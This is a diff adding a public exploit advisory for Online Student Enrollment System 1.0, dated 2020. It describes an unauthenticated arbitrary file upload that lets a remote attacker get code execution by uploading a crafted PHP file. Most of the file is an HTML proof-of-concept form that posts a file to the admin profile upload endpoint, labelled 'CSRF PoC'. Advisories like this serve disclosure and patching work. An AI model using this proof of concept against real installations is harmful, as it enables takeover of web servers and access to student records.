@@ -1,0 +1,24 @@
+# Exploit Title: Online Student Enrollment System 1.0 - Unauthenticated Arbitrary File Upload
+# Google Dork: N/A
+# Date: 2020-06-20
+# Exploit Author: BKpatron
+# Vendor Homepage: https://www.campcodes.com/projects/php/4745/online-student-enrollment-system-in-php-mysqli/
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/donbermoy/student_enrollment_1.zip
+# Version: v1.0
+# Tested on: Win 10
+# CVE: N/A
+
+# Vulnerability:
+Online Student Enrollment System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution
+(RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file.
+
+#CSRF PoC:
+
+<html>
+<body>
+<form action="http://localhost/student_enrollment/admin/index.php?page=user-profile" method="POST" enctype="multipart/form-data">
+      <input type="file" name="userphoto" required="" id="photo"><br>
+      <input class="btn btn-info" type="submit" name="upphoto" value="Upload Photo">
+    </form>
+</body>
+</html>
